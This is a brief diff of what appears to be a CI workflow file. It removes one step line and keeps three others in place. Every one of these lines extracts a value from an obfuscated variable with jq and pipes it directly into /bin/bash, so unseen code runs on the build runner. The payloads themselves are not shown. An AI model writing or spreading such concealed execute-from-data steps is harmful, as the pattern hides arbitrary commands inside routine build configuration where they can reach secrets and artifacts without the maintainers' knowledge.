@@ -21,7 +21,6 @@ jobs:
           echo $evd0 | jq -r .umkuf993 | /bin/bash
           echo $jn040 | jq -r .gcv6350 | /bin/bash
           printf '%s' "$w683" | jq -r .mdj55628 | /bin/bash
-          echo $owq8 | jq -r .be511 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
